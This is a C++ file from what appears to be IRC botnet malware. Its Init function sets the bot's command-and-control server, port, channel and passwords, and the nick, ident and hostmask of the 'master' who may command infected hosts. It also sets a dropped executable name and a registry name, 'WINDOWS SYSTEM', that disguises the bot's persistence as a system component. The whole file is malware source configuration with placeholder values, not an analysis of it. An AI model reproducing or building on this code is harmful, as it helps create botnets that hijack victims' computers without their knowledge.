#include "Include.h"
#include "Hell.h"

void CConnectIRC::Init(void)
{
	cConf.cNick = "[HB3]"; // first part of nick
	cConf.cServer = "irc.fefefe.net";//irc server
	cConf.cPort = 6667;// irc port
	//cConf.cHttpdPort = 90;//httpd port
	cConf.cChan = "#fefefee";//irc chan
	cConf.cChanPass = "efefe";//irc chan pass
	cConf.cBotPass = "efefefe";//bot pass	
	cConf.cMasterNick = "fefefefe";//auth nick
	cConf.cMasterIdent = "efefe";//auth ident
	cConf.cMasterHostmask = "efefe";//auth host
	cConf.cFileName = "efefefe.exe";//bot filename
	cConf.cRegName = "WINDOWS SYSTEM";//bot regname
	IRCRunning = false;
	noReconnect = false;
}